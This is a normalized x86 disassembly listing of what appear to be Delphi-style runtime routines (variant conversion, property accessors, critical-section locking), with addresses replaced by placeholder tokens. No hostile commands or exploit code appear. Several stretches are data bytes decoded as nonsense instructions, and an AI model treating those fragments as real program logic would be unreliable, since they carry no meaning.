mov eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4046e0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4091d8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046e0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4091d8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4046e0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40eb94
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4045d0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ebcc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4045d0
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4046a4
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404790
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40ec04
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4045d0
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4046e0
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4046e0
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407ed4
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4046e0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407ed4
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5a4
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f3c0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4045d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fafd
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4045ac
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403ed8
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4045ac
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403ed8
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4045ac
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403ed8
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4045ac
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed8
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f478
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4045d0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046e0
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e0c8
test ah 0x40
je r-xdata
mov eax esi
call sub_404594
mov edx eax
mov eax ebx
call sub_40f4dc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f3c0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4045d0
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f3c0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4045d0
jmp r-xdata
jmp [ eax * 4 + jump_table_40f865 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4046e0
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4091d8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4091d8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40eb94
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4045d0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ebcc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4045d0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ec04
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4045d0
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4046e0
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4046e0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407ed4
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407ed4
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4046e0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5a4
jmp r-xdata
sub_40fb04
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e7ac
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fb40
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e7ac
sub_40fb6c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e7ac
sub_40fbd0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f08
pop esi
pop ebx
retn
mov eax ebx
call sub_40e7ac
sub_40fbfc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404790
pop esi
pop ebx
retn
mov eax ebx
call sub_40e7ac
sub_40fdb8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fede
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f08
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f08
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410214
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f08
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041c0
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407efc
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4041c0
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403048
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402864
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404118
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fee5
lea eax [ ebp - 0x208 ]
call sub_403eb4
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041c0
sub_40ff60
dec [ eax + 0x80040db ]
push esi
popad
jb r-xdata
cmp bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410214
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410194
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ff70
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_40ffd1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404c7c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ffd8
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4030f8
sub_410020
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410194
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410214
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410074
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4100ac
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410194
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4100e8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40346c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41014b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410152
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4101ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031ac
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410214
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4102bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c7c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4102cc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4103a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410385
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c84
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41038c
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403048
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404118
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407ab4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4103bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41042b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410432
retn
call sub_40ff70
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e44
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
call sub_403eb4
mov eax rw-data
call sub_40e83c
sub_410434
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4104d5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104dc
retn
mov eax rw-data
call sub_40ff40
mov eax sub_40e53c
mov [ rw-data ] eax
mov eax sub_40e164
mov [ rw-data ] eax
mov edx sub_40e074
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e83c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fc34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eb50
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ee7c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f5a4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4104e0
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] dl
inc esi
add [ ebp + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] bl
inc esi
add [ ebp + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] al
inc esi
add [ ebp + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_410605
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41060c
retn
sub_410650
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41069c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410644
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407f24
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410650
mov edx [ rw-data ]
mov eax esi
call sub_407ab4
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407ab4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407f24
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410700
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410770
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4107e4
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410840
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410894
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404150
mov ecx esp
mov edx esi
mov eax ebx
call sub_410840
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4108dc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4108c8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41091c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410964
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4046e0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4109a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41096b
lea eax [ ebp - 0x4 ]
call sub_404594
retn
sub_410974
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410894
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4108dc
pop ebx
retn
dec bl
je r-xdata
call sub_41091c
jmp r-xdata
pop ebx
retn
sub_4109a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410a66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_40413c
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410974
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a6d
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4045d0
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410644
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410abc ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410beb ]
jmp [ eax * 4 + jump_table_410b58 ]
fld [ ebp + 0x8 ]
